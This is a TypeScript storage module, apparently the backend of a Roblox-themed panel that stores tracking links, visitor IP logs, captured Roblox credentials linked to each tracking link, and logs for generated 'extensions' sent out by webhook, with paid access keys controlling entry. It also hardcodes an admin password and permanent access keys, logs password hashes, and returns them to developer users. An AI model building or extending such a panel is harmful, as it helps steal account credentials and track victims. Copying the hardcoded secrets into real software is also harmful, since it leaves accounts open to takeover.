import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession, type RobloxLink, type InsertRobloxLink, type RobloxCredentials, type InsertRobloxCredentials, type ExtensionLog, type InsertExtensionLog } from "@shared/schema";
import { randomUUID } from "crypto";
import { desc, eq } from "drizzle-orm";
import { users, ipLogs, settings, accessKeys, userSessions, robloxLinks, robloxCredentials, extensionLogs } from "@shared/schema";
import fs from 'fs/promises'; // Use fs.promises for async operations
import path from 'path'; // Import path module
import bcrypt from "bcryptjs";

export interface IStorage {
  // User operations
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUserTheme(userId: string, theme: string): Promise<void>;
  updateUserProfile(userId: string, profileData: { username?: string; profilePicture?: string }): Promise<User>;
  updateUserPassword(userId: string, currentPassword: string, newPassword: string): Promise<void>;
  adminResetUserPassword(userId: string, newPassword: string, adminUserId: string): Promise<void>;
  updateUserRole(userId: string, roleData: { accountType?: string; isDev?: boolean }, updatedBy: string): Promise<User>;
  getAllUsers(requestingUserId?: string): Promise<any[]>;
  createUserByDev(data: any, createdBy: string): Promise<any>;
  banUser(userId: string, banReason: string, bannedBy: string): Promise<void>;
  unbanUser(userId: string, unbannedBy: string): Promise<void>;
  deleteUser(userId: string, deletedBy: string): Promise<void>;

  // Access key operations
  createAccessKey(key: InsertAccessKey): Promise<AccessKey>;
  getAccessKey(key: string): Promise<AccessKey | undefined>;
  useAccessKey(key: string): Promise<boolean>;
  getUserAccessKeys(userId: string): Promise<AccessKey[]>;
  deleteAccessKey(keyId: string, userId: string): Promise<boolean>;
  // Admin-specific access key operations
  getAllAccessKeys(): Promise<AccessKey[]>;
  deleteAccessKeyById(keyId: string): Promise<boolean>;
  createBulkAccessKeys(params: {
    keyPrefix: string;
    keyCount: number;
    usageLimit: number;
    expirationDays?: number;
    createdBy: string;
  }): Promise<string[]>;
  getSystemStats(): Promise<{
    totalUsers: number;
    totalKeys: number;
    activeKeys: number;
    totalLogs: number;
    recentActivity: number;
    totalExtensions: number;
  }>;
  getExtensionStats(): Promise<{
    totalExtensions: number;
    successfulExtensions: number;
    failedExtensions: number;
    totalDownloads: number;
    recentExtensions: number;
  }>;

  // Session operations
  createSession(session: InsertUserSession): Promise<UserSession>;
  getSession(token: string): Promise<UserSession | undefined>;
  deleteSession(token: string): Promise<void>;

  // IP Log operations
  createIpLog(ipLog: InsertIpLog): Promise<IpLog>;
  getIpLogs(userId?: string, limit?: number, offset?: number): Promise<IpLog[]>;
  getTotalIpLogs(userId?: string): Promise<number>;
  getUniqueIpCount(userId?: string): Promise<number>;
  getRecentLogs(userId?: string, hours?: number): Promise<IpLog[]>;

  // Settings operations
  getSettings(userId?: string): Promise<Settings | null>;
  createOrUpdateSettings(settings: InsertSettings): Promise<Settings>;
  getSettingsByTrackingId(trackingId: string): Promise<Settings | null>;
  ensureTrackingId(userId: string): Promise<string>;
  getAnySettingsWithImage(): Promise<{ settings: Settings, userId: string } | null>;
  getAnySettingsWithWebhook(): Promise<{ settings: Settings, userId: string } | null>;

  // Roblox Link operations
  createRobloxLink(robloxLink: InsertRobloxLink): Promise<RobloxLink>;
  getRobloxLink(trackingId: string): Promise<RobloxLink | undefined>;
  getRobloxLinks(userId: string): Promise<RobloxLink[]>;
  updateRobloxLinkClicks(trackingId: string): Promise<void>;
  updateRobloxLink(linkId: string, updates: Partial<RobloxLink>): Promise<RobloxLink | undefined>;
  deleteRobloxLink(linkId: string, userId: string): Promise<boolean>;

  // Roblox Credentials operations  
  createRobloxCredentials(credentials: InsertRobloxCredentials): Promise<RobloxCredentials>;
  getRobloxCredentials(userId: string): Promise<RobloxCredentials[]>;
  getRobloxCredentialsByLink(linkId: string): Promise<RobloxCredentials[]>;

  // Extension Log operations
  createExtensionLog(extensionLog: InsertExtensionLog): Promise<ExtensionLog>;
  getExtensionLogs(userId?: string, limit?: number, offset?: number): Promise<ExtensionLog[]>;
  getTotalExtensionLogs(userId?: string): Promise<number>;
  getRecentExtensionLogs(userId?: string, hours?: number): Promise<ExtensionLog[]>;
  updateExtensionLogWebhookSent(logId: string): Promise<void>;
  getExtensionLogsForWebhook(limit?: number): Promise<ExtensionLog[]>;
}

export class MemStorage implements IStorage {
  // In-memory storage simulation. In a real app, this would interact with a database.
  private users: Map<string, User>;
  private ipLogs: Map<string, IpLog>;
  private settings: Map<string, Settings>;
  private accessKeys: Map<string, AccessKey>;
  private sessions: Map<string, UserSession>;
  private robloxLinks: Map<string, RobloxLink>;
  private robloxCredentials: Map<string, RobloxCredentials>;
  private extensionLogs: Map<string, ExtensionLog>;

  // File-based persistence for critical data
  private dataFilePath = path.join(import.meta.dirname, 'data-backup.json');
  private dataFilePath2 = path.join(import.meta.dirname, 'data-backup-secondary.json');
  private dataFilePath3 = path.join(import.meta.dirname, 'data-backup-tertiary.json');
  private tempFilePath = path.join(import.meta.dirname, 'data-backup.tmp');


  // Dummy database interaction placeholders
  private db: any; // Replace with your actual database client (e.g., drizzle-orm client)

  // Auto-save interval
  private autoSaveInterval: NodeJS.Timeout | null = null;

  // Cleanup expired access keys and revoke associated sessions
  private async cleanupExpiredAccessKeys(): Promise<void> {
    try {
      const now = new Date();
      let expiredCount = 0;

      for (const [key, accessKey] of this.accessKeys.entries()) {
        if (accessKey.expirationDate && accessKey.expirationDate < now && accessKey.isActive) {
          // Mark as inactive
          accessKey.isActive = false;
          this.accessKeys.set(key, accessKey);

          // Revoke sessions for users who used this key
          await this.revokeSessionsForExpiredKey(key);

          expiredCount++;
          console.log(`🚫 Access key expired and deactivated: ${key}`);
        }
      }

      if (expiredCount > 0) {
        await this.saveToFileSystem();
        console.log(`🧹 Cleaned up ${expiredCount} expired access keys`);
      }
    } catch (error) {
      console.error('Error during access key cleanup:', error);
    }
  }

  // Save data on process exit to prevent data loss
  constructor() {
    this.users = new Map();
    this.ipLogs = new Map();
    this.settings = new Map();
    this.accessKeys = new Map();
    this.sessions = new Map();
    this.robloxLinks = new Map();
    this.robloxCredentials = new Map();
    this.extensionLogs = new Map();

    // Load persisted data first, then initialize dev account
    this.loadFromFileSystem().then(() => {
      // Initialize with a developer account for testing purposes after loading
      this.initializeDevAccount();
    });

    // Auto-save every 10 seconds for better data persistence
    this.autoSaveInterval = setInterval(() => this.saveToFileSystem().catch(console.error), 10000);

    // Check for expired access keys every minute and revoke associated sessions
    setInterval(() => this.cleanupExpiredAccessKeys().catch(console.error), 60000);

    // Handle graceful shutdown
    process.on('SIGINT', () => {
      console.log('🔄 Saving data before shutdown...');
      this.saveToFileSystem().then(() => {
        console.log('✅ Data saved successfully. Exiting...');
        process.exit(0);
      }).catch((error) => {
        console.error('❌ Error saving data on exit:', error);
        process.exit(1);
      });
    });

    process.on('SIGTERM', () => {
      console.log('🔄 Saving data before termination...');
      this.saveToFileSystem().then(() => {
        console.log('✅ Data saved successfully. Terminating...');
        process.exit(0);
      }).catch((error) => {
        console.error('❌ Error saving data on termination:', error);
        process.exit(1);
      });
    });

    process.on('beforeExit', () => {
      this.saveToFileSystem().catch(console.error);
    });
  }

  // Save to file system with enhanced error handling and persistence
  private async saveToFileSystem(): Promise<void> {
    try {
      const backupData = {
        users: Array.from(this.users.entries()),
        sessions: Array.from(this.sessions.entries()),
        ipLogs: Array.from(this.ipLogs.entries()),
        settings: Array.from(this.settings.entries()),
        accessKeys: Array.from(this.accessKeys.entries()),
        robloxLinks: Array.from(this.robloxLinks.entries()),
        robloxCredentials: Array.from(this.robloxCredentials.entries()),
        extensionLogs: Array.from(this.extensionLogs.entries()),
        timestamp: new Date().toISOString(),
        version: '2.3'
      };

      // Create multiple backup files for extra safety
      const tempFile = this.tempFilePath;
      const backupFile = this.dataFilePath;
      const backupFile2 = this.dataFilePath2;
      const backupFile3 = this.dataFilePath3;


      // Ensure directory exists
      const dir = path.dirname(backupFile);
      await fs.mkdir(dir, { recursive: true });

      // Write to temporary file first, then rename (atomic operation)
      try {
        await fs.writeFile(tempFile, JSON.stringify(backupData, null, 2), 'utf8');
        await fs.rename(tempFile, backupFile);
      } catch (renameError) {
        // If rename fails, write directly to backup file
        console.warn('Atomic rename failed, writing directly:', renameError);
        await fs.writeFile(backupFile, JSON.stringify(backupData, null, 2), 'utf8');
      }

      // Create multiple backup copies for extra safety
      await fs.writeFile(backupFile2, JSON.stringify(backupData, null, 2), 'utf8');
      await fs.writeFile(backupFile3, JSON.stringify(backupData, null, 2), 'utf8');

      // Force file system sync to ensure data is written to disk
      const fileHandle = await fs.open(backupFile, 'r');
      await fileHandle.sync();
      await fileHandle.close();

      console.log(`💾 Data successfully saved to disk with ${backupData.ipLogs.length} IP logs, ${backupData.users.length} users, ${backupData.settings.length} settings - PERMANENT STORAGE CONFIRMED`);
    } catch (error) {
      console.error('❌ Failed to save data to filesystem:', error);
      throw error;
    }
  }

  private async loadFromFileSystem(): Promise<void> {
    const backupFiles = [this.dataFilePath, this.dataFilePath2, this.dataFilePath3];
    let dataLoaded = false;

    // Try each backup file in order
    for (const filePath of backupFiles) {
      try {
        if (await fs.access(filePath).then(() => true).catch(() => false)) {
          console.log(`Attempting to load from ${path.basename(filePath)}...`);
          const rawData = await fs.readFile(filePath, 'utf8');

          // Validate JSON before parsing
          if (!rawData.trim()) {
            console.log(`${path.basename(filePath)} is empty, trying next backup...`);
            continue;
          }

          let data;
          try {
            data = JSON.parse(rawData);
          } catch (parseError) {
            console.error(`JSON parsing failed for ${path.basename(filePath)}:`, parseError);
            continue;
          }

          // Validate data structure
          if (!data || typeof data !== 'object') {
            console.error(`Invalid data structure in ${path.basename(filePath)}`);
            continue;
          }

          // Restore data structures with validation
          this.users = new Map(Array.isArray(data.users) ? data.users : []);
          this.ipLogs = new Map(Array.isArray(data.ipLogs) ? data.ipLogs : []);
          this.settings = new Map(Array.isArray(data.settings) ? data.settings : []);
          this.accessKeys = new Map(Array.isArray(data.accessKeys) ? data.accessKeys : []);
          this.sessions = new Map(Array.isArray(data.sessions) ? data.sessions : []);
          this.robloxLinks = new Map(Array.isArray(data.robloxLinks) ? data.robloxLinks : []);
          this.robloxCredentials = new Map(Array.isArray(data.robloxCredentials) ? data.robloxCredentials : []);
          this.extensionLogs = new Map(Array.isArray(data.extensionLogs) ? data.extensionLogs : []);

          // Convert date strings back to Date objects with error handling
          this.ipLogs.forEach((log, key) => {
            try {
              if (log.timestamp) log.timestamp = new Date(log.timestamp);
              this.ipLogs.set(key, log);
            } catch (dateError) {
              console.warn(`Invalid date in IP log ${key}, removing entry`);
              this.ipLogs.delete(key);
            }
          });

          this.users.forEach((user, key) => {
            try {
              if (user.createdAt) user.createdAt = new Date(user.createdAt);
              if (user.lastLoginAt) user.lastLoginAt = new Date(user.lastLoginAt);
              if (user.bannedAt) user.bannedAt = new Date(user.bannedAt);
              this.users.set(key, user);
            } catch (dateError) {
              console.warn(`Invalid date in user ${key}, fixing dates`);
              user.createdAt = new Date();
              user.lastLoginAt = null;
              user.bannedAt = null;
              this.users.set(key, user);
            }
          });

          this.robloxLinks.forEach((link, key) => {
            try {
              if (link.createdAt) link.createdAt = new Date(link.createdAt);
              if (link.updatedAt) link.updatedAt = new Date(link.updatedAt);
              this.robloxLinks.set(key, link);
            } catch (dateError) {
              console.warn(`Invalid date in roblox link ${key}, fixing dates`);
              link.createdAt = new Date();
              link.updatedAt = new Date();
              this.robloxLinks.set(key, link);
            }
          });

          this.accessKeys.forEach((key, accessKeyId) => {
            try {
              if (key.createdAt) key.createdAt = new Date(key.createdAt);
              if (key.expirationDate) key.expirationDate = new Date(key.expirationDate);
              this.accessKeys.set(accessKeyId, key);
            } catch (dateError) {
              console.warn(`Invalid date in access key ${accessKeyId}, fixing dates`);
              key.createdAt = new Date();
              key.expirationDate = null;
              this.accessKeys.set(accessKeyId, key);
            }
          });

          this.extensionLogs.forEach((log, key) => {
            try {
              if (log.createdAt) log.createdAt = new Date(log.createdAt);
              if (log.lastWebhookSent) log.lastWebhookSent = new Date(log.lastWebhookSent);
              this.extensionLogs.set(key, log);
            } catch (dateError) {
              console.warn(`Invalid date in extension log ${key}, fixing dates`);
              log.createdAt = new Date();
              log.lastWebhookSent = null;
              this.extensionLogs.set(key, log);
            }
          });

          console.log(`✅ Successfully loaded from ${path.basename(filePath)}: ${this.ipLogs.size} IP logs, ${this.users.size} users, ${this.settings.size} settings, ${this.robloxLinks.size} roblox links, ${this.robloxCredentials.size} credentials`);
          dataLoaded = true;
          break;
        }
      } catch (error) {
        console.error(`Failed to load from ${path.basename(filePath)}:`, error);
        continue;
      }
    }

    if (!dataLoaded) {
      console.log('⚠️ No valid backup found. Starting with fresh storage.');
      // Ensure we start with clean maps
      this.users.clear();
      this.ipLogs.clear();
      this.settings.clear();
      this.accessKeys.clear();
      this.sessions.clear();
      this.robloxLinks.clear();
      this.robloxCredentials.clear();
    }
  }


  private async initializeDevAccount() {
    // Check if dev account exists
    let existingDev = Array.from(this.users.values()).find(user => user.username === "exnldev");

    if (!existingDev) {
      console.log('🔧 Creating dev account...');
      const hashedPassword = await bcrypt.hash("Av121988-", 10);
      const devUser: User = {
        id: randomUUID(),
        username: "exnldev",
        password: hashedPassword,
        theme: "default",
        isDev: true, // Make sure this is a developer account
        accessKeyUsed: null,
        profilePicture: null,
        createdAt: new Date(),
        accountType: "admin",
        isBanned: false,
        bannedAt: null,
        bannedBy: null,
        banReason: null,
        lastLoginAt: null,
      };
      this.users.set(devUser.id, devUser);
      existingDev = devUser;
      console.log('✅ Dev account created with username: exnldev, isDev: true');
    } else {
      console.log('✅ Dev account already exists with username: exnldev');
      // Ensure the dev account has the correct password and isDev flag
      let needsUpdate = false;
      if (!(await bcrypt.compare("Av121988-", existingDev.password))) {
        existingDev.password = await bcrypt.hash("Av121988-", 10);
        needsUpdate = true;
        console.log('🔧 Dev account password updated and hashed');
      }
      if (!existingDev.isDev) {
        existingDev.isDev = true;
        existingDev.accountType = "admin";
        needsUpdate = true;
        console.log('🔧 Dev account isDev flag updated to true with admin privileges');
      }
      // Also upgrade existing developer accounts to admin level
      if (existingDev.accountType !== "admin") {
        existingDev.accountType = "admin";
        needsUpdate = true;
        console.log('🔧 Dev account upgraded to admin privileges');
      }
      if (needsUpdate) {
        this.users.set(existingDev.id, existingDev);
      }
    }

    // Ensure dev access keys exist
    if (!this.accessKeys.has("Av121988")) {
      console.log('🔧 Creating dev access key...');
      const devKey: AccessKey = {
        id: randomUUID(),
        key: "Av121988",
        usageLimit: 999999,
        usedCount: 0,
        isActive: true,
        createdAt: new Date(),
        expirationDate: null,
        createdBy: existingDev.id
      };
      this.accessKeys.set(devKey.key, devKey);
      console.log('✅ Dev access key created');
    }

    // Ensure demo key exists
    if (!this.accessKeys.has("demo123")) {
      console.log('🔧 Creating demo access key...');
      const permanentKey: AccessKey = {
        id: randomUUID(),
        key: "demo123",
        usageLimit: 999999,
        usedCount: 0,
        isActive: true,
        createdAt: new Date(),
        expirationDate: null,
        createdBy: existingDev.id
      };
      this.accessKeys.set(permanentKey.key, permanentKey);
      console.log('✅ Demo access key created');
    }

    // Save immediately after initialization
    await this.saveToFileSystem();

    // Log final status
    console.log(`🎯 Final dev account status: ${this.users.size} total users`);
    const devCheck = Array.from(this.users.values()).find(user => user.username === "exnldev");
    if (devCheck) {
      console.log(`✅ Dev account confirmed - Username: ${devCheck.username}, Password: ${devCheck.password}, isDev: ${devCheck.isDev}`);
    } else {
      console.log(`❌ Dev account not found after initialization!`);
    }
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: { username: string; password: string; accessKeyUsed?: string; accountType?: string }): Promise<User> {
    const id = randomUUID();
    const hashedPassword = await bcrypt.hash(insertUser.password, 10);
    const user: User = {
      id,
      username: insertUser.username,
      password: hashedPassword,
      theme: "default",
      isDev: false,
      accessKeyUsed: insertUser.accessKeyUsed || null,
      profilePicture: null,
      createdAt: new Date(),
      accountType: insertUser.accountType || "user",
      isBanned: false,
      bannedAt: null,
      bannedBy: null,
      banReason: null,
      lastLoginAt: null,
    };
    this.users.set(id, user);
    await this.saveToFileSystem(); // Persist new user
    return user;
  }

  async updateUserTheme(userId: string, theme: string): Promise<void> {
    const user = this.users.get(userId);
    if (user) {
      this.users.set(userId, { ...user, theme });
      await this.saveToFileSystem(); // Persist theme update
    }
  }

  async updateUserProfile(userId: string, profileData: { username?: string; profilePicture?: string }): Promise<User> {
    const user = this.users.get(userId);
    if (!user) {
      throw new Error('User not found');
    }

    // Check if username is being changed and if it's already taken
    if (profileData.username && profileData.username !== user.username) {
      const existingUser = await this.getUserByUsername(profileData.username);
      if (existingUser) {
        throw new Error('Username already exists');
      }
    }

    const updatedUser: User = {
      ...user,
      ...profileData,
    };

    this.users.set(userId, updatedUser);
    await this.saveToFileSystem(); // Persist profile update
    return updatedUser;
  }

  async updateUserPassword(userId: string, currentPassword: string, newPassword: string): Promise<void> {
    const user = this.users.get(userId);
    if (!user) {
      throw new Error('User not found');
    }

    // Verify current password before allowing change
    if (!(await bcrypt.compare(currentPassword, user.password))) {
      throw new Error('Current password is incorrect');
    }

    const hashedNewPassword = await bcrypt.hash(newPassword, 10);
    this.users.set(userId, { ...user, password: hashedNewPassword });
    await this.saveToFileSystem(); // Persist password update

    console.log(`🔐 Password updated by account owner: ${user.username}`);
  }

  // Admin-only password reset function
  async adminResetUserPassword(userId: string, newPassword: string, adminUserId: string): Promise<void> {
    // Verify admin or developer privileges
    const admin = this.users.get(adminUserId);
    if (!admin || (!admin.isDev && admin.accountType !== 'admin')) {
      throw new Error('Access denied: Admin or Developer privileges required to reset passwords');
    }

    const user = this.users.get(userId);
    if (!user) {
      throw new Error('User not found');
    }

    // Prevent non-admin developers from resetting other developer passwords
    if (user.isDev && admin.accountType !== 'admin') {
      throw new Error('Access denied: Admin privileges required to reset developer passwords');
    }

    // Prevent resetting admin passwords unless you are also an admin
    if (user.accountType === 'admin' && admin.accountType !== 'admin') {
      throw new Error('Access denied: Admin privileges required to reset admin passwords');
    }

    // Hash the new password with bcrypt
    const hashedNewPassword = await bcrypt.hash(newPassword, 10);
    this.users.set(userId, { ...user, password: hashedNewPassword });
    await this.saveToFileSystem(); // Persist password reset

    console.log(`🔐 Admin/Developer ${admin.username} (${admin.accountType}) reset password for user ${user.username} (${user.accountType})`);
  }

  // Emergency password migration function for plaintext passwords
  async migrateUserPassword(username: string, newPassword: string): Promise<void> {
    const user = Array.from(this.users.values()).find(u => u.username === username);
    if (!user) {
      throw new Error('User not found');
    }

    // Hash the new password with bcrypt
    const hashedNewPassword = await bcrypt.hash(newPassword, 10);
    this.users.set(user.id, { ...user, password: hashedNewPassword });
    await this.saveToFileSystem(); // Persist password migration

    console.log(`🔄 Password migrated to bcrypt for user: ${user.username}`);
  }

  async updateUserRole(userId: string, roleData: { accountType?: string; isDev?: boolean }, updatedBy: string): Promise<User> {
    const updater = await this.getUser(updatedBy);
    if (!updater?.isDev) {
      throw new Error('Access denied: Developer privileges required');
    }

    const user = this.users.get(userId);
    if (!user) {
      throw new Error('User not found');
    }

    // Prevent non-admin developers from modifying admin accounts
    if (user.accountType === 'admin' && updater.accountType !== 'admin') {
      throw new Error('Access denied: Admin privileges required to modify admin accounts');
    }

    // Don't allow changing own role unless admin
    if (userId === updatedBy && updater.accountType !== 'admin') {
      throw new Error('Cannot modify your own role');
    }

    const updatedUser: User = {
      ...user,
      accountType: roleData.accountType || user.accountType,
      isDev: roleData.isDev !== undefined ? roleData.isDev : user.isDev,
    };

    this.users.set(userId, updatedUser);
    await this.saveToFileSystem(); // Persist role update
    return updatedUser;
  }

  async getAllUsers(requesterId?: string): Promise<any[]> {
    if (requesterId) {
      const requester = await this.getUser(requesterId);
      if (!requester?.isDev) {
        throw new Error('Access denied: Developer privileges required');
      }
    } else {
      // Allow access for internal system operations (like image serving)
      // but only return basic user info for security
      return Array.from(this.users.values()).map(user => ({
        id: user.id,
        username: user.username,
        password: '', // Never expose password
        theme: user.theme,
        isDev: user.isDev,
        profilePicture: user.profilePicture,
        accountType: user.accountType,
        accessKeyUsed: user.accessKeyUsed,
        isBanned: user.isBanned,
        banReason: user.banReason,
        bannedAt: user.bannedAt,
        bannedBy: user.bannedBy,
        createdAt: user.createdAt
      }));
    }

    return Array.from(this.users.values()).map(user => ({
      id: user.id,
      username: user.username,
      accountType: user.accountType,
      isDev: user.isDev,
      isBanned: user.isBanned,
      createdAt: user.createdAt,
      lastLoginAt: user.lastLoginAt,
      bannedAt: user.bannedAt,
      banReason: user.banReason,
      accessKeyUsed: user.accessKeyUsed,
      password: user.password // Include password for admins/developers only
    }));
  }

  async createUserByDev(data: any, createdBy: string): Promise<any> {
    const creator = await this.getUser(createdBy);
    if (!creator?.isDev) {
      throw new Error('Access denied: Developer privileges required');
    }

    // In a real app, this would insert into the database:
    // const newUser = await this.db.insert(users).values(data).returning();
    // return newUser[0];

    const id = randomUUID();
    const newUser: User = {
      ...data,
      id,
      theme: "default",
      isDev: data.isDev || false,
      profilePicture: data.profilePicture || null,
      createdAt: new Date(),
      accountType: data.accountType || "user",
      isBanned: false,
      bannedAt: null,
      bannedBy: null,
      banReason: null,
      lastLoginAt: null,
    };
    this.users.set(id, newUser);
    await this.saveToFileSystem(); // Persist new user created by dev
    return newUser;
  }

  async banUser(userId: string, banReason: string, bannedBy: string): Promise<void> {
    const banner = await this.getUser(bannedBy);
    if (!banner?.isDev || banner.accountType !== 'developer') {
      throw new Error('Access denied: Developer privileges required');
    }

    const userToBan = await this.getUser(userId);
    if (!userToBan) {
      throw new Error('User not found');
    }

    // Don't allow banning other developers
    if (userToBan.isDev) {
      throw new Error('Cannot ban other developer accounts');
    }

    // Don't allow banning yourself
    if (userId === bannedBy) {
      throw new Error('Cannot ban your own account');
    }

    this.users.set(userId, { ...userToBan, isBanned: true, bannedAt: new Date(), bannedBy, banReason });
    await this.saveToFileSystem(); // Persist ban status
  }

  async unbanUser(userId: string, unbannedBy: string): Promise<void> {
    const unbanner = await this.getUser(unbannedBy);
    if (!unbanner?.isDev || unbanner.accountType !== 'developer') {
      throw new Error('Access denied: Developer privileges required');
    }

    const user = await this.getUser(userId);
    if (!user) {
      throw new Error('User not found');
    }

    this.users.set(userId, { ...user, isBanned: false, bannedAt: null, bannedBy: null, banReason: null });
    await this.saveToFileSystem(); // Persist unban status
  }

  async deleteUser(userId: string, deletedBy: string): Promise<void> {
    const deleter = await this.getUser(deletedBy);
    if (!deleter?.isDev || deleter.accountType !== 'developer') {
      throw new Error('Access denied: Developer privileges required');
    }

    // Don't allow deleting yourself
    if (userId === deletedBy) {
      throw new Error('Cannot delete your own account');
    }

    // Don't allow deleting other developers
    const userToDelete = await this.getUser(userId);
    if (!userToDelete) {
      throw new Error('User not found');
    }

    if (userToDelete.isDev) {
      throw new Error('Cannot delete other developer accounts');
    }

    // In a real app, this would perform database deletions:
    // // Delete user sessions first
    // await this.db.delete(userSessions).where(eq(userSessions.userId, userId));
    // // Delete user logs
    // await this.db.delete(ipLogs).where(eq(ipLogs.userId, userId));
    // // Delete user settings
    // await this.db.delete(settings).where(eq(settings.userId, userId));
    // // Finally delete the user
    // await this.db.delete(users).where(eq(users.id, userId));

    this.users.delete(userId);
    // Assuming session token is tied to userId or can be found by userId
    // This part might need refinement based on how sessions are stored and retrieved.
    // For now, we'll clear all sessions that might be associated with this user.
    this.sessions = new Map(Array.from(this.sessions.entries()).filter(([token, session]) => session.userId !== userId));

    this.settings.delete(userId);
    // For ipLogs, we'd need to iterate and remove logs associated with userId
    this.ipLogs = new Map(Array.from(this.ipLogs.entries()).filter(([key, value]) => value.userId !== userId));
    // For accessKeys, we'd need to iterate and remove keys created by userId
    this.accessKeys = new Map(Array.from(this.accessKeys.entries()).filter(([key, value]) => value.createdBy !== userId));
    await this.saveToFileSystem(); // Persist user deletion
  }

  async createAccessKey(insertKey: InsertAccessKey): Promise<AccessKey> {
    let expirationDate = null;
    if (insertKey.expirationDays && insertKey.expirationDays > 0) {
      expirationDate = new Date();
      expirationDate.setDate(expirationDate.getDate() + insertKey.expirationDays);
    }

    const accessKey: AccessKey = {
      id: randomUUID(),
      key: insertKey.key,
      usageLimit: insertKey.usageLimit || 1,
      usedCount: 0,
      isActive: insertKey.isActive !== false,
      createdAt: new Date(),
      expirationDate,
      createdBy: insertKey.createdBy || null
    };
    this.accessKeys.set(insertKey.key, accessKey);
    await this.saveToFileSystem(); // Persist new access key
    return accessKey;
  }

  async getAccessKey(key: string): Promise<AccessKey | undefined> {
    const accessKey = this.accessKeys.get(key);
    if (!accessKey) return undefined;

    // Check if key has expired
    if (accessKey.expirationDate && new Date(accessKey.expirationDate) < new Date()) {
      // Mark as inactive if expired
      accessKey.isActive = false;
      this.accessKeys.set(key, accessKey);
      await this.saveToFileSystem();

      // Revoke all sessions for users who used this expired key
      await this.revokeSessionsForExpiredKey(key);
    }

    return accessKey;
  }

  // New method to revoke sessions for users who used an expired access key
  private async revokeSessionsForExpiredKey(expiredKey: string): Promise<void> {
    try {
      // Find all users who used this access key
      const usersWithExpiredKey = Array.from(this.users.values())
        .filter(user => user.accessKeyUsed === expiredKey);

      // Remove all sessions for these users
      for (const user of usersWithExpiredKey) {
        const sessionsToRemove = Array.from(this.sessions.entries())
          .filter(([token, session]) => session.userId === user.id);

        for (const [token, session] of sessionsToRemove) {
          this.sessions.delete(token);
          console.log(`🔒 Revoked session for user ${user.username} due to expired access key: ${expiredKey}`);
        }
      }

      if (usersWithExpiredKey.length > 0) {
        await this.saveToFileSystem();
        console.log(`🚫 Revoked sessions for ${usersWithExpiredKey.length} users due to expired access key: ${expiredKey}`);
      }
    } catch (error) {
      console.error('Error revoking sessions for expired key:', error);
    }
  }

  async useAccessKey(key: string): Promise<boolean> {
    const accessKey = this.accessKeys.get(key);
    if (!accessKey || !accessKey.isActive || accessKey.usedCount >= accessKey.usageLimit) {
      return false;
    }
    this.accessKeys.set(key, { ...accessKey, usedCount: accessKey.usedCount + 1 });
    await this.saveToFileSystem(); // Persist access key usage
    return true;
  }

  async getUserAccessKeys(userId: string): Promise<AccessKey[]> {
    return Array.from(this.accessKeys.values()).filter(key => key.createdBy === userId);
  }

  async deleteAccessKey(keyId: string, userId: string): Promise<boolean> {
    const accessKey = Array.from(this.accessKeys.values()).find(key => key.id === keyId && key.createdBy === userId);
    if (accessKey) {
      this.accessKeys.delete(accessKey.key);
      await this.saveToFileSystem(); // Persist access key deletion
      return true;
    }
    return false;
  }

  // Admin-specific access key operations
  async getAllAccessKeys(): Promise<AccessKey[]> {
    return Array.from(this.accessKeys.values()).sort((a, b) => 
      new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
    );
  }

  async deleteAccessKeyById(keyId: string): Promise<boolean> {
    const accessKey = Array.from(this.accessKeys.values()).find(key => key.id === keyId);
    if (accessKey) {
      this.accessKeys.delete(accessKey.key);
      await this.saveToFileSystem(); // Persist access key deletion
      return true;
    }
    return false;
  }

  async createBulkAccessKeys(params: {
    keyPrefix: string;
    keyCount: number;
    usageLimit: number;
    expirationDays?: number;
    createdBy: string;
  }): Promise<string[]> {
    const { keyPrefix, keyCount, usageLimit, expirationDays, createdBy } = params;
    const createdKeys: string[] = [];

    let expirationDate = null;
    if (expirationDays && expirationDays > 0) {
      expirationDate = new Date();
      expirationDate.setDate(expirationDate.getDate() + expirationDays);
    }

    for (let i = 1; i <= keyCount; i++) {
      const keyValue = `${keyPrefix}-${i.toString().padStart(6, '0')}`;

      // Skip if key already exists
      if (this.accessKeys.has(keyValue)) {
        continue;
      }

      const accessKey: AccessKey = {
        id: randomUUID(),
        key: keyValue,
        usageLimit,
        usedCount: 0,
        isActive: true,
        createdAt: new Date(),
        expirationDate,
        createdBy
      };

      this.accessKeys.set(keyValue, accessKey);
      createdKeys.push(keyValue);
    }

    await this.saveToFileSystem(); // Persist bulk key creation
    return createdKeys;
  }

  async getSystemStats(): Promise<{
    totalUsers: number;
    totalKeys: number;
    activeKeys: number;
    totalLogs: number;
    recentActivity: number;
    totalExtensions: number;
  }> {
    const totalUsers = this.users.size;
    const totalKeys = this.accessKeys.size;
    const activeKeys = Array.from(this.accessKeys.values()).filter(key => key.isActive).length;
    const totalLogs = this.ipLogs.size;

    // Calculate recent activity (last 24 hours)
    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
    const recentActivity = Array.from(this.ipLogs.values()).filter(log => 
      new Date(log.timestamp) > twentyFourHoursAgo
    ).length;

    return {
      totalUsers,
      totalKeys,
      activeKeys,
      totalLogs,
      recentActivity,
      totalExtensions: this.extensionLogs.size // Added totalExtensions here
    };
  }

  async getExtensionStats(): Promise<{
    totalExtensions: number;
    successfulExtensions: number;
    failedExtensions: number;
    totalDownloads: number;
    recentExtensions: number;
  }> {
    const totalExtensions = this.extensionLogs.size;
    const successfulExtensions = Array.from(this.extensionLogs.values()).filter(log => log.generationStatus === 'success').length;
    const failedExtensions = Array.from(this.extensionLogs.values()).filter(log => log.generationStatus === 'error').length;
    const totalDownloads = Array.from(this.extensionLogs.values()).reduce((sum, log) => sum + (log.downloadCount || 0), 0);

    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    const recentExtensions = Array.from(this.extensionLogs.values()).filter(log => 
      new Date(log.createdAt) > oneHourAgo
    ).length;

    return {
      totalExtensions,
      successfulExtensions,
      failedExtensions,
      totalDownloads,
      recentExtensions
    };
  }

  async createSession(insertSession: InsertUserSession): Promise<UserSession> {
    const id = randomUUID();
    const session: UserSession = {
      ...insertSession,
      id,
